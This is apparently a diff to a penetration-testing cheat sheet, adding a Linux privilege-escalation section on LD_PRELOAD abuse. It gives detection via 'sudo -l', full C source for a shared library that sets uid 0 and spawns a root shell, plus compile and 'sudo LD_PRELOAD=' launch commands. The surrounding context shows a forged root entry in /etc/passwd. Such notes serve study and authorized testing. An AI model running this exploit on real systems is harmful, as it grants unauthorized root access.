@@ -806,8 +806,34 @@ cd /home
 ./nano -p etc/passwd
 raj:x:0:0:,,,:/home/raj:/bin/bash
 ```
-   
 
+5. LD_PRELOAD
+- LD_Preload: It is an environment variable that lists shared libraries with functions that override the standard set
+- Detection: 'sudo -l', look out for 'env_keep += LD_PRELOAD'
+- exploitation: 
+```bash
+cd tmp
+nano shell.c
+
+#exploit code, can be found at hack tricks
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
+
+#compile command
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+
+#launch exploit
+ls -al shell.so
+sudo LD_PRELOAD=/tmp/shell.so find
+```
+  
 # Active Directory Pentesting
 ## Enumeration
 - To check local administrators in domain joined machine
